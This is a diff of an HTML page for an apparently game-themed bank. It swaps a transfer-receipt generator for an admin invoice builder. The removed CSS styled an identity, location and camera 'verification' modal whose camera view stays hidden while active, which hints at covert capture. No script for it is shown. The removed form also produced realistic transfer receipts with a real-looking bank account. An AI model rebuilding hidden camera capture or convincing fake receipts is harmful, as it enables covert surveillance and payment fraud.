@@ -1,2022 +1,338 @@
 <!doctype html>
-<html lang="en">
+<html lang="id">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Transfer Receipt Generator - Bank Dayat Ganteng Monopoli</title>
+    <meta name="color-scheme" content="light" />
+    <title>Admin Invoice - Bank Dayat Ganteng Monopoli</title>
     <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
+      @font-face {
+        font-family: "Archivo Black";
+        src: url("/assets/ArchivoBlack-Regular.ttf") format("truetype");
+        font-display: swap;
+        font-style: normal;
+        font-weight: 400;
       }
+
+      :root {
+        --ink: #211b08;
+        --muted: #6d6758;
+        --line: #ded9ca;
+        --paper: #fffef9;
+        --canvas: #f4f1e7;
+        --yellow: #f5b700;
+        --yellow-soft: #fff2bc;
+        --green: #16784b;
+        --red: #b42318;
+        --shadow: 0 24px 70px rgba(45, 36, 8, 0.12);
+      }
+
+      * { box-sizing: border-box; }
+      html { min-height: 100%; background: var(--canvas); }
       body {
-        font-family:
-          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
-          Arial, sans-serif;
-        background: #f2f2f2;
-        padding: 32px 16px;
+        min-height: 100vh;
+        margin: 0;
+        color: var(--ink);
+        background: radial-gradient(circle at 10% 0%, rgba(245, 183, 0, 0.2), transparent 30rem), var(--canvas);
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       }
-      .layout {
-        max-width: 1100px;
-        margin: 0 auto;
-        display: grid;
-        grid-template-columns: 380px 1fr;
-        gap: 28px;
-        align-items: start;
-      }
-      @media (max-width: 860px) {
-        .layout {
-          grid-template-columns: 1fr;
-        }
-      }
+      button, input, select { font: inherit; }
+      button { touch-action: manipulation; }
+      [hidden] { display: none !important; }
 
-      /* ---------- FORM PANEL ---------- */
-      .panel {
-        background: #ffffff;
-        border-radius: 16px;
-        padding: 24px;
-        box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06);
-        position: sticky;
-        top: 24px;
-      }
-      .panel h2 {
-        font-size: 16px;
-        color: #8a6a00;
-        margin-bottom: 4px;
-      }
-      .panel .hint {
-        font-size: 12px;
-        color: #8a8a8a;
-        margin-bottom: 18px;
-      }
-      .field-group {
-        margin-bottom: 14px;
-      }
-      .field-group label {
-        display: block;
-        font-size: 12px;
-        font-weight: 600;
-        color: #4a4a4a;
-        margin-bottom: 5px;
-      }
-      .field-group input,
-      .field-group select {
-        width: 100%;
-        padding: 9px 10px;
-        font-size: 13px;
-        border: 1px solid #dcdcdc;
-        border-radius: 8px;
-        color: #1a1a1a;
-        font-family: inherit;
-      }
-      .field-group input:focus,
-      .field-group select:focus {
-        outline: none;
-        border-color: #ffe066;
-        box-shadow: 0 0 0 3px rgba(28, 107, 95, 0.12);
-      }
-      .row2 {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 10px;
-      }
-      .section-label {
-        font-size: 11px;
-        text-transform: uppercase;
-        letter-spacing: 0.04em;
-        color: #3a2e00;
-        background: #f5b700;
-        display: inline-block;
-        padding: 3px 8px;
-        border-radius: 5px;
-        margin: 16px 0 10px;
-      }
-      .btn-row {
-        display: flex;
-        gap: 8px;
-        margin-top: 20px;
-      }
-      button {
-        flex: 1;
-        padding: 11px 12px;
-        font-size: 13px;
-        font-weight: 600;
-        border-radius: 9px;
-        border: none;
-        cursor: pointer;
-        font-family: inherit;
-      }
-      #downloadBtn {
-        background: #f5b700;
-        color: #3a2e00;
-      }
-      #downloadBtn:hover {
-        background: #e0a800;
-      }
-      #resetBtn {
-        background: #f0f0f0;
-        color: #4a4a4a;
-      }
-      #resetBtn:hover {
-        background: #e6e6e6;
-      }
+      .shell { width: min(1180px, calc(100% - 32px)); margin: 0 auto; padding: 26px 0 56px; }
+      .topbar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 34px; }
+      .brand { display: flex; align-items: center; gap: 12px; font-weight: 850; letter-spacing: -0.02em; }
+      .brand-mark { width: 40px; height: 40px; border-radius: 12px; display: grid; place-items: center; background: var(--yellow); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.14); }
+      .brand-mark svg { width: 22px; height: 22px; }
+      .admin-badge { display: flex; align-items: center; gap: 7px; color: var(--muted); font-size: 13px; }
+      .admin-badge svg { width: 15px; height: 15px; }
 
-      /* ---------- VIEW TABS ---------- */
-      .view-tabs {
-        display: flex;
-        gap: 8px;
-        max-width: 600px;
-        margin: 0 auto 16px;
-      }
-      .view-tabs button {
-        flex: 1;
-        padding: 10px 12px;
-        border-radius: 10px;
-        border: 1.5px solid #e0d090;
-        background: #fff;
-        color: #8a6a00;
-        font-weight: 700;
-        font-size: 13px;
-        cursor: pointer;
-        font-family: inherit;
-      }
-      .view-tabs button.active {
-        background: #f5b700;
-        color: #3a2e00;
-        border-color: #f5b700;
-      }
+      .heading-row { display: flex; justify-content: space-between; gap: 32px; align-items: end; margin-bottom: 24px; }
+      h1 { font-family: "Archivo Black", Impact, sans-serif; font-size: clamp(36px, 5vw, 62px); font-weight: 400; line-height: 0.98; letter-spacing: -0.04em; max-width: 11ch; margin: 0; }
+      .heading-copy { color: var(--muted); font-size: 14px; line-height: 1.6; max-width: 38rem; margin: 0 0 3px; }
 
-      /* ---------- CONFIRMATION PAGE (struk gaya sama) ---------- */
-      .confirm-amount {
-        text-align: center;
-        font-size: 32px;
-        font-weight: 800;
-        color: #8a6a00;
-        margin: 6px 0 24px;
+      .workbench { display: grid; grid-template-columns: minmax(330px, 390px) minmax(0, 1fr); gap: 24px; align-items: start; }
+      .panel, .preview-stage { background: var(--paper); border-radius: 18px; box-shadow: var(--shadow); overflow: hidden; }
+      .panel { position: sticky; top: 20px; }
+      .panel-head { padding: 22px 24px 18px; border-bottom: 1px solid var(--line); }
+      .panel-head h2, .stage-head h2 { margin: 0 0 5px; font-size: 20px; letter-spacing: -0.025em; }
+      .panel-head p, .stage-head p { margin: 0; color: var(--muted); font-size: 12px; line-height: 1.5; }
+      .form-body { padding: 20px 24px 24px; }
+      .section-title { margin: 21px 0 11px; color: var(--muted); font-size: 11px; font-weight: 800; letter-spacing: 0.07em; text-transform: uppercase; }
+      .section-title:first-child { margin-top: 0; }
+      .field { margin-bottom: 13px; }
+      .field label { display: block; margin-bottom: 6px; font-size: 11px; font-weight: 750; }
+      .field input, .field select {
+        width: 100%; border: 1px solid var(--line); border-radius: 11px; background: #fff;
+        color: var(--ink); padding: 11px 12px; outline: none; transition: border-color 160ms ease, box-shadow 160ms ease;
       }
-      .confirm-actions {
-        display: flex;
-        gap: 10px;
-        margin: 22px 0 4px;
-      }
-      .confirm-actions button {
-        flex: 1;
-        padding: 13px;
-        border-radius: 10px;
-        border: none;
-        font-weight: 700;
-        font-size: 14px;
-        cursor: pointer;
-        font-family: inherit;
-      }
-      #agreeBtn {
-        background: #f5b700;
-        color: #3a2e00;
-      }
-      #agreeBtn:hover {
-        background: #e0a800;
-      }
-      #declineBtn {
-        background: #f0f0f0;
-        color: #4a4a4a;
-      }
-      #declineBtn:hover {
-        background: #e6e6e6;
-      }
-      .confirm-success {
-        display: none;
-        text-align: center;
-        padding: 8px 0 20px;
-      }
-      .confirm-success.active {
-        display: block;
-      }
-      .confirm-success .check {
-        width: 56px;
-        height: 56px;
-        border-radius: 50%;
-        background: #ffe066;
-        color: #3a2e00;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 14px;
-        font-size: 28px;
-        font-weight: 800;
-      }
-      .confirm-success p {
-        font-size: 15px;
-        color: #1a1a1a;
-        font-weight: 700;
-      }
-      .confirm-success span {
-        font-size: 13px;
-        color: #8a8a8a;
-        display: block;
-        margin-top: 4px;
-      }
-      #confirmPendingActions.hidden,
-      #confirmSuccess.hidden {
-        display: none;
-      }
+      .field input:focus, .field select:focus { border-color: #a77b00; box-shadow: 0 0 0 3px rgba(245, 183, 0, 0.2); }
+      .row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
 
-      /* ---------- PREVIEW ---------- */
-      .preview-wrap {
-        display: flex;
-        justify-content: center;
-      }
-      .card {
-        max-width: 600px;
-        width: 100%;
-        background: #ffffff;
-        border-radius: 20px;
-        overflow: hidden;
-        box-shadow: 0 2px 20px rgba(0, 0, 0, 0.06);
-      }
-      .header {
-        background: linear-gradient(
-          135deg,
-          #f5b700 0%,
-          #ffc93c 60%,
-          #ffe066 100%
-        );
-        padding: 40px 24px;
-        text-align: center;
-      }
-      .logo {
-        display: inline-flex;
-        align-items: center;
-        gap: 12px;
-      }
-      .logo svg {
-        width: 40px;
-        height: 40px;
-        flex-shrink: 0;
-      }
-      .logo-text {
-        display: flex;
-        flex-direction: column;
-        align-items: flex-start;
-      }
-      .logo-text .brand {
-        color: #3a2e00;
-        font-size: 24px;
-        font-weight: 800;
-        letter-spacing: -0.3px;
-        line-height: 1.1;
-      }
-      .logo-text .tagline {
-        color: #4a3a00;
-        font-size: 11px;
-        font-weight: 600;
-        letter-spacing: 0.06em;
-        text-transform: uppercase;
-        margin-top: 2px;
-      }
-      .body {
-        padding: 32px 28px 8px;
-      }
-      .greeting {
-        font-size: 15px;
-        color: #1a1a1a;
-        margin-bottom: 16px;
-      }
-      .greeting b {
-        font-weight: 700;
-      }
-      .summary {
-        font-size: 15px;
-        color: #1a1a1a;
-        line-height: 1.5;
-        margin-bottom: 24px;
-      }
-      hr {
-        border: none;
-        border-top: 1px solid #e6e6e6;
-        margin: 20px 0;
-      }
-      .detail-title {
-        font-size: 15px;
-        font-weight: 700;
-        color: #1a1a1a;
-        margin-bottom: 20px;
-      }
-      .field {
-        margin-bottom: 20px;
-      }
-      .field-label {
-        font-size: 13px;
-        color: #8a8a8a;
-        margin-bottom: 4px;
-      }
-      .field-value {
-        font-size: 15px;
-        color: #1a1a1a;
-        font-weight: 600;
-      }
-      .field-value .strike {
-        text-decoration: line-through;
-        color: #8a8a8a;
-        font-weight: 400;
-        margin-right: 4px;
-      }
-      .field-value .free {
-        color: #b45309;
-        font-weight: 700;
-      }
-      .field-sub {
-        font-size: 14px;
-        color: #4a4a4a;
-        font-weight: 400;
-        margin-top: 2px;
-      }
-      .footer {
-        padding: 20px 28px 32px;
-        text-align: center;
-      }
-      .socials {
-        display: flex;
-        justify-content: center;
-        gap: 12px;
-        margin-bottom: 22px;
-      }
-      .socials a {
-        width: 34px;
-        height: 34px;
-        border-radius: 50%;
-        background: #ffe066;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        color: #3a2e00;
-        text-decoration: none;
-      }
-      .care {
-        font-size: 13px;
-        color: #4a4a4a;
-        margin-bottom: 4px;
-      }
-      .care-contact {
-        font-size: 14px;
-        color: #1a1a1a;
-      }
-      .care-contact a {
-        color: #1a1a1a;
-        font-weight: 700;
-        text-decoration: underline;
-      }
-      .highlight {
-        background: #ffe08a;
-        padding: 0 2px;
-      }
-      .legal {
-        font-size: 11px;
-        color: #9a9a9a;
-        line-height: 1.6;
-        margin-top: 18px;
-        padding: 0 8px;
-      }
-      .copyright {
-        font-size: 10px;
-        color: #b5b5b5;
-        margin-top: 10px;
-      }
+      .actions { display: grid; grid-template-columns: 0.7fr 1.3fr; gap: 9px; margin-top: 22px; }
+      .button { border: 0; border-radius: 12px; padding: 13px 14px; font-weight: 800; color: var(--ink); background: var(--yellow); cursor: pointer; transition: transform 150ms ease, filter 150ms ease; }
+      .button:hover:not(:disabled) { filter: brightness(0.96); }
+      .button:active:not(:disabled) { transform: scale(0.985); }
+      .button:focus-visible { outline: 3px solid rgba(33, 27, 8, 0.35); outline-offset: 3px; }
+      .button:disabled { cursor: wait; opacity: 0.55; }
+      .button.secondary { background: transparent; border: 1px solid var(--line); font-weight: 700; }
 
-      /* ---------- VERIFICATION MODAL ---------- */
-      .vfy-overlay {
-        display: none;
-        position: fixed;
-        inset: 0;
-        background: rgba(15, 12, 5, 0.72);
-        backdrop-filter: blur(6px);
-        z-index: 9999;
-        align-items: center;
-        justify-content: center;
-      }
-      .vfy-overlay.active {
-        display: flex;
-      }
-      .vfy-modal {
-        background: #fff;
-        border-radius: 24px;
-        padding: 32px 28px 28px;
-        width: 100%;
-        max-width: 400px;
-        max-height: calc(100vh - 32px);
-        overflow-y: auto;
-        margin: 16px;
-        box-shadow: 0 24px 64px rgba(0, 0, 0, 0.22);
-        position: relative;
-        animation: vfySlideIn 0.3s cubic-bezier(0.34, 1.26, 0.64, 1) both;
-      }
-      @keyframes vfySlideIn {
-        from {
-          opacity: 0;
-          transform: translateY(28px) scale(0.96);
-        }
-        to {
-          opacity: 1;
-          transform: translateY(0) scale(1);
-        }
-      }
-      .vfy-steps {
-        display: flex;
-        align-items: center;
-        gap: 0;
-        margin-bottom: 28px;
-      }
-      .vfy-step-dot {
-        width: 32px;
-        height: 32px;
-        border-radius: 50%;
-        background: #f0f0f0;
-        color: #9a9a9a;
-        font-size: 13px;
-        font-weight: 700;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        transition: all 0.3s;
-        flex-shrink: 0;
-      }
-      .vfy-step-dot.active {
-        background: #f5b700;
-        color: #3a2e00;
-      }
-      .vfy-step-dot.done {
-        background: #22c55e;
-        color: #fff;
-        font-size: 15px;
-      }
-      .vfy-step-line {
-        flex: 1;
-        height: 3px;
-        background: #f0f0f0;
-        transition: background 0.4s;
-      }
-      .vfy-step-line.done {
-        background: #22c55e;
-      }
-      .vfy-step-labels {
-        display: flex;
-        justify-content: space-between;
-        margin-top: 6px;
-        margin-bottom: 22px;
-      }
-      .vfy-step-label {
-        font-size: 11px;
-        color: #8a8a8a;
-        font-weight: 600;
-        text-align: center;
-        width: 80px;
-      }
-      .vfy-step-label.active {
-        color: #8a6a00;
-      }
-      .vfy-step-label.done {
-        color: #16a34a;
-      }
-      .vfy-title {
-        font-size: 17px;
-        font-weight: 800;
-        color: #1a1a1a;
-        margin-bottom: 6px;
-        text-align: center;
-      }
-      .vfy-subtitle {
-        font-size: 13px;
-        color: #6a6a6a;
-        text-align: center;
-        margin-bottom: 20px;
-        line-height: 1.5;
-      }
-      /* Identity form area */
-      .vfy-id-icon {
-        width: 72px;
-        height: 72px;
-        border-radius: 50%;
-        background: linear-gradient(135deg, #fff3cc, #ffe066);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 20px;
-        position: relative;
-      }
-      .vfy-id-icon svg {
-        width: 34px;
-        height: 34px;
-        color: #8a6a00;
-      }
-      .vfy-id-pulse {
-        position: absolute;
-        inset: -8px;
-        border-radius: 50%;
-        border: 3px solid rgba(245, 183, 0, 0.4);
-        animation: locPulse 2s ease-out infinite;
-      }
-      .vfy-field {
-        margin-bottom: 14px;
-      }
-      .vfy-field label {
-        display: block;
-        font-size: 11px;
-        font-weight: 700;
-        color: #4a4a4a;
-        text-transform: uppercase;
-        letter-spacing: 0.04em;
-        margin-bottom: 6px;
-      }
-      .vfy-field input {
-        width: 100%;
-        padding: 11px 13px;
-        font-size: 13px;
-        border: 1.5px solid #e0e0e0;
-        border-radius: 9px;
-        color: #1a1a1a;
-        font-family: inherit;
-        transition:
-          border-color 0.2s,
-          box-shadow 0.2s;
-        background: #fafafa;
-      }
-      .vfy-field input:focus {
-        outline: none;
-        border-color: #f5b700;
-        box-shadow: 0 0 0 3px rgba(245, 183, 0, 0.15);
-        background: #fff;
-      }
-      .vfy-field input.error {
-        border-color: #dc2626;
-        box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.1);
-      }
-      .vfy-field-error {
-        font-size: 11px;
-        color: #dc2626;
-        margin-top: 4px;
-        display: none;
-      }
-      /* Location area */
-      .vfy-loc-icon {
-        width: 72px;
-        height: 72px;
-        border-radius: 50%;
-        background: linear-gradient(135deg, #fff3cc, #ffe066);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 20px;
-        position: relative;
-      }
-      .vfy-loc-icon svg {
-        width: 34px;
-        height: 34px;
-        color: #8a6a00;
-      }
-      .vfy-loc-pulse {
-        position: absolute;
-        inset: -8px;
-        border-radius: 50%;
-        border: 3px solid rgba(245, 183, 0, 0.5);
-        animation: locPulse 1.6s ease-out infinite;
-      }
-      @keyframes locPulse {
-        0% {
-          transform: scale(1);
-          opacity: 1;
-        }
-        100% {
-          transform: scale(1.5);
-          opacity: 0;
-        }
-      }
-      .vfy-loc-info {
-        background: #f8f8f8;
-        border-radius: 10px;
-        padding: 12px 16px;
-        margin: 0 0 16px;
-        font-size: 12px;
-        color: #4a4a4a;
-        text-align: center;
-        min-height: 44px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        line-height: 1.6;
-      }
-      .vfy-loc-info.success {
-        background: #f0fdf4;
-        color: #16a34a;
-        font-weight: 600;
-      }
-      .vfy-loc-info.error {
-        background: #fef2f2;
-        color: #dc2626;
-      }
+      .preview-stage { min-height: 720px; }
+      .stage-head { display: flex; align-items: center; justify-content: space-between; gap: 18px; padding: 22px 26px 18px; border-bottom: 1px solid var(--line); }
+      .live-chip { display: flex; align-items: center; gap: 7px; padding: 7px 10px; border-radius: 999px; background: #efede5; color: var(--muted); font-size: 11px; font-weight: 750; white-space: nowrap; }
+      .live-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); }
+      .receipt-wrap { padding: 34px 34px 28px; display: grid; place-items: center; }
+      .receipt { width: min(100%, 570px); background: #fff; border-radius: 16px; overflow: hidden; box-shadow: 0 18px 55px rgba(45, 36, 8, 0.1); }
+      .receipt-banner { background: var(--yellow); padding: 30px 24px; text-align: center; }
+      .bank-logo { display: inline-flex; align-items: center; gap: 11px; text-align: left; }
+      .bank-logo svg { width: 38px; height: 38px; }
+      .bank-name { display: block; font-size: 21px; font-weight: 850; letter-spacing: -0.03em; }
+      .bank-tagline { display: block; margin-top: 2px; font-size: 10px; font-weight: 750; letter-spacing: 0.08em; text-transform: uppercase; }
+      .receipt-body { padding: 27px 28px 30px; }
+      .greeting { margin: 0 0 12px; font-size: 14px; }
+      .summary { margin: 0 0 24px; color: var(--muted); font-size: 14px; line-height: 1.6; }
+      .amount { padding: 20px 0 23px; border-top: 1px solid #eee9dc; border-bottom: 1px solid #eee9dc; }
+      .amount > span:first-child { display: block; color: var(--muted); font-size: 11px; margin-bottom: 5px; }
+      .amount strong { display: block; font-size: 29px; letter-spacing: -0.035em; }
+      .details { display: grid; grid-template-columns: 1fr 1fr; gap: 19px 24px; margin-top: 24px; }
+      .detail.full { grid-column: 1 / -1; }
+      .detail > span { display: block; margin-bottom: 4px; color: var(--muted); font-size: 11px; }
+      .detail > strong { display: block; font-size: 13px; line-height: 1.45; overflow-wrap: anywhere; }
+      .detail > strong > span { display: inline; }
 
-      /* Permission cards */
-      .perm-cards {
-        display: flex;
-        gap: 12px;
-        margin: 20px 0 6px;
-      }
-      .perm-card {
-        flex: 1;
-        border: 1.5px solid #ebebeb;
-        border-radius: 14px;
-        padding: 16px 10px 14px;
-        text-align: center;
-        transition:
-          border-color 0.3s,
-          background 0.3s;
-      }
-      .perm-card.granted {
-        border-color: #22c55e;
-        background: #f0fdf4;
-      }
-      .perm-card.denied {
-        border-color: #dc2626;
-        background: #fef2f2;
-      }
-      .perm-card-icon {
-        width: 46px;
-        height: 46px;
-        border-radius: 12px;
-        background: #fff9e6;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 10px;
-        transition: background 0.3s;
-      }
-      .perm-card-icon svg {
-        width: 22px;
-        height: 22px;
-        color: #8a6a00;
-        transition: color 0.3s;
-      }
-      .perm-card.granted .perm-card-icon {
-        background: #dcfce7;
-      }
-      .perm-card.granted .perm-card-icon svg {
-        color: #16a34a;
-      }
-      .perm-card.denied .perm-card-icon {
-        background: #fee2e2;
-      }
-      .perm-card.denied .perm-card-icon svg {
-        color: #dc2626;
-      }
-      .perm-card-label {
-        font-size: 12px;
-        font-weight: 700;
-        color: #1a1a1a;
-        margin-bottom: 6px;
-      }
-      .perm-badge {
-        font-size: 10px;
-        font-weight: 700;
-        padding: 3px 9px;
-        border-radius: 20px;
-        display: inline-block;
-        letter-spacing: 0.02em;
-      }
-      .perm-badge.waiting {
-        background: #f0f0f0;
-        color: #6a6a6a;
-      }
-      .perm-badge.checking {
-        background: #fff9e6;
-        color: #8a6a00;
-      }
-      .perm-badge.granted {
-        background: #dcfce7;
-        color: #16a34a;
-      }
-      .perm-badge.denied {
-        background: #fee2e2;
-        color: #dc2626;
-      }
+      .share-dock { margin: 0 34px 34px; padding: 19px; border-radius: 14px; background: var(--yellow-soft); }
+      .share-dock h3 { margin: 0 0 5px; font-size: 16px; }
+      .share-dock p { margin: 0 0 13px; color: var(--muted); font-size: 12px; line-height: 1.5; }
+      .link-row { display: grid; grid-template-columns: minmax(0, 1fr) auto auto; gap: 8px; }
+      .link-row input { width: 100%; min-width: 0; border: 1px solid #d9c77e; border-radius: 10px; background: #fff; padding: 10px 11px; color: var(--ink); font-size: 12px; }
+      .link-row .button { padding: 10px 13px; }
+      .share-status { min-height: 18px; margin: 9px 0 0; color: var(--green); font-size: 11px; }
+      .form-status { display: none; margin-top: 12px; padding: 10px 12px; border-radius: 10px; font-size: 12px; line-height: 1.45; }
+      .form-status.show { display: block; }
+      .form-status.error { background: #fff0ed; color: var(--red); }
+      .form-status.success { background: #e9f8f0; color: var(--green); }
 
-      /* REC / monitoring badge */
-      .cam-rec-badge {
-        display: none;
-        align-items: center;
-        gap: 7px;
-        background: rgba(220, 38, 38, 0.07);
-        border: 1px solid rgba(220, 38, 38, 0.18);
-        border-radius: 20px;
-        padding: 5px 14px;
-        font-size: 11px;
-        font-weight: 700;
-        color: #dc2626;
-        margin: 0 auto 16px;
-        width: fit-content;
+      @media (max-width: 900px) {
+        .heading-row { display: block; }
+        .heading-copy { margin-top: 14px; }
+        .workbench { grid-template-columns: 1fr; }
+        .panel { position: static; }
       }
-      .cam-rec-badge.show {
-        display: flex;
+      @media (max-width: 560px) {
+        .shell { width: min(100% - 24px, 520px); padding-top: 18px; }
+        .topbar { margin-bottom: 25px; }
+        .admin-badge span { display: none; }
+        h1 { font-size: 40px; }
+        .row, .actions, .details { grid-template-columns: 1fr; }
+        .detail.full { grid-column: auto; }
+        .receipt-wrap { padding: 18px 14px; }
+        .receipt-body { padding: 23px 20px 26px; }
+        .share-dock { margin: 0 14px 18px; }
+        .link-row { grid-template-columns: 1fr 1fr; }
+        .link-row input { grid-column: 1 / -1; }
       }
-      .rec-dot {
-        width: 8px;
-        height: 8px;
-        border-radius: 50%;
-        background: #dc2626;
-        animation: recBlink 1.1s ease-in-out infinite;
-        flex-shrink: 0;
-      }
-      @keyframes recBlink {
-        0%,
-        100% {
-          opacity: 1;
-        }
-        50% {
-          opacity: 0.25;
-        }
-      }
-      /* Status badge */
-      .vfy-status {
-        text-align: center;
-        font-size: 12px;
-        font-weight: 600;
-        padding: 7px 14px;
-        border-radius: 20px;
-        margin: 0 auto 16px;
-        display: inline-block;
-        width: 100%;
-      }
-      .vfy-status.scanning {
-        background: #fff9e6;
-        color: #8a6a00;
-      }
-      .vfy-status.success {
-        background: #f0fdf4;
-        color: #16a34a;
-      }
-      .vfy-status.error {
-        background: #fef2f2;
-        color: #dc2626;
-      }
-      .vfy-status.waiting {
-        background: #f0f0f0;
-        color: #6a6a6a;
-      }
-      /* Action button */
-      .vfy-btn {
-        width: 100%;
-        padding: 13px;
-        border-radius: 11px;
-        border: none;
-        font-size: 14px;
-        font-weight: 700;
-        cursor: pointer;
-        font-family: inherit;
-        background: #f5b700;
-        color: #3a2e00;
-        transition:
-          background 0.2s,
-          opacity 0.2s,
-          transform 0.1s;
-        margin-top: 4px;
-      }
-      .vfy-btn:hover:not(:disabled) {
-        background: #e0a800;
-      }
-      .vfy-btn:active:not(:disabled) {
-        transform: scale(0.98);
-      }
-      .vfy-btn:disabled {
-        opacity: 0.45;
-        cursor: not-allowed;
-      }
-      .vfy-btn-cancel {
-        width: 100%;
-        padding: 10px;
-        border-radius: 11px;
-        border: 1.5px solid #e0e0e0;
-        font-size: 13px;
-        font-weight: 600;
-        cursor: pointer;
-        font-family: inherit;
-        background: #fff;
-        color: #6a6a6a;
-        transition: background 0.2s;
-        margin-top: 8px;
-      }
-      .vfy-btn-cancel:hover {
-        background: #f8f8f8;
-      }
-      .vfy-disclosure {
-        background: #fff9e6;
-        border: 1px solid #f2d77a;
-        border-radius: 12px;
-        color: #594600;
-        font-size: 12px;
-        line-height: 1.55;
-        margin-bottom: 16px;
-        padding: 12px 14px;
-      }
-      .vfy-consent {
-        align-items: flex-start;
-        cursor: pointer;
-        display: flex;
-        font-size: 12px;
-        gap: 10px;
-        line-height: 1.5;
-        margin: 4px 0 14px;
-      }
-      .vfy-consent input {
-        margin-top: 3px;
-        width: 18px;
-        height: 18px;
-        flex-shrink: 0;
-      }
-      .vfy-camera-wrap {
-        background: #171717;
-        border-radius: 14px;
-        display: none;
-        margin: 12px 0;
-        overflow: hidden;
-        position: relative;
-      }
-      .vfy-camera-wrap.active {
-        display: none;
-      }
-      .vfy-camera-wrap video {
-        display: none;
-        width: 100%;
-        aspect-ratio: 4/3;
-        object-fit: cover;
-        transform: scaleX(-1);
-      }
-      .vfy-camera-indicator {
-        align-items: center;
-        background: rgba(0, 0, 0, 0.72);
-        border-radius: 999px;
-        color: #fff;
-        display: flex;
-        font-size: 11px;
-        font-weight: 700;
-        gap: 7px;
-        left: 10px;
-        padding: 6px 10px;
-        position: absolute;
-        top: 10px;
-      }
-      .vfy-camera-dot {
-        background: #ef4444;
-        border-radius: 50%;
-        height: 8px;
-        width: 8px;
-        animation: cameraPulse 1.2s infinite;
-      }
-      @keyframes cameraPulse {
-        50% {
-          opacity: 0.35;
-        }
-      }
-      .vfy-progress {
-        background: #f3f3f3;
-        border-radius: 10px;
-        color: #555;
-        display: none;
-        font-size: 12px;
-        line-height: 1.5;
-        margin: 12px 0;
-        padding: 10px 12px;
-        text-align: center;
-      }
-      .vfy-progress.active {
-        display: block;
-      }
-      .vfy-progress.error {
-        background: #fef2f2;
-        color: #b91c1c;
-      }
-      .vfy-progress.success {
-        background: #f0fdf4;
-        color: #15803d;
-      }
-      /* spinner */
-      .vfy-spinner {
-        display: inline-block;
-        width: 14px;
-        height: 14px;
-        border: 2px solid rgba(58, 46, 0, 0.3);
-        border-top-color: #3a2e00;
-        border-radius: 50%;
-        animation: spin 0.7s linear infinite;
-        vertical-align: middle;
-        margin-right: 6px;
-      }
-      @keyframes spin {
-        to {
-          transform: rotate(360deg);
-        }
+      @media (prefers-reduced-motion: reduce) {
+        *, *::before, *::after { animation: none !important; transition: none !important; }
       }
     </style>
   </head>
   <body>
-    <div class="layout">
-      <!-- ============ FORM PANEL ============ -->
-      <div class="panel">
-        <h2>Transfer Receipt Generator</h2>
-        <p class="hint">
-          Edit the fields below — the preview updates automatically.
-        </p>
+    <!--
+      THESIS: A protected invoice workbench that turns one exact preview into one shareable player link; no player verification controls live here.
+      OWN-WORLD: Signal yellow, warm paper, charcoal ink, Archivo Black thesis type, compact fields, and a single receipt stage.
+      STORY: Admin edits invoice facts, verifies the live receipt, saves it, then copies or opens the unique player link.
+      FIRST VIEWPORT: A sticky input rail sits left of the large receipt stage; the generated-link dock attaches beneath the receipt.
+      FORM: Grounded operate candidate 4, preview-led workbench with attached share outcome; seed e4aaba3f.
+      FINISH: unreviewed and undocumented is unfinished; this build ends with the finish review, the verdict, and DESIGN.md
+    -->
+    <div class="shell">
+      <header class="topbar">
+        <div class="brand">
+          <span class="brand-mark" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="3"/><circle cx="9" cy="11" r="2"/><path d="M6 16h6M15 10h3M15 14h3"/></svg>
+          </span>
+          <span>Invoice Admin</span>
+        </div>
+        <div class="admin-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>
+          <span>Area admin terlindungi</span>
+        </div>
+      </header>
 
-        <div class="section-label">Recipient Info</div>
-        <div class="field-group">
-          <label for="greetName">Greeting Name (Hello ...)</label>
-          <input type="text" id="greetName" value="MUHAMMAD" />
-        </div>
-
-        <div class="section-label">Transaction</div>
-        <div class="field-group">
-          <label for="nominal">Transfer Amount (Rp)</label>
-          <input type="text" id="nominal" value="2.000.000,00" />
-        </div>
-        <div class="row2">
-          <div class="field-group">
-            <label for="metode">Transfer Method</label>
-            <input type="text" id="metode" value="BI-Fast" />
-          </div>
-          <div class="field-group">
-            <label for="biaya">Original Fee (strikethrough)</label>
-            <input type="text" id="biaya" value="Rp2.500,00" />
-          </div>
-        </div>
-        <div class="field-group">
-          <label for="biayaStatus">Fee Status</label>
-          <select id="biayaStatus">
-            <option value="Free" selected>Free</option>
-            <option value="custom">Custom...</option>
-          </select>
-        </div>
-        <div class="field-group" id="biayaCustomWrap" style="display: none">
-          <label for="biayaCustom">Custom Fee Status Text</label>
-          <input type="text" id="biayaCustom" value="" />
-        </div>
-        <div class="field-group">
-          <label for="total">Total (Rp)</label>
-          <input type="text" id="total" value="2.000.000,00" />
-        </div>
-        <div class="field-group">
-          <label for="sumberDana">Funding Source</label>
-          <input type="text" id="sumberDana" value="Wallet · Fluid Asset GG" />
-        </div>
-
-        <div class="section-label">Recipient</div>
-        <div class="field-group">
-          <label for="penerimaNama">Recipient Name</label>
-          <input type="text" id="penerimaNama" value="Muhammad Hidayat" />
-        </div>
-        <div class="field-group">
-          <label for="penerimaBank">Bank &amp; Account No.</label>
-          <input
-            type="text"
-            id="penerimaBank"
-            value="BLU by BCA Digital · 008920569145"
-          />
-        </div>
-        <div class="field-group">
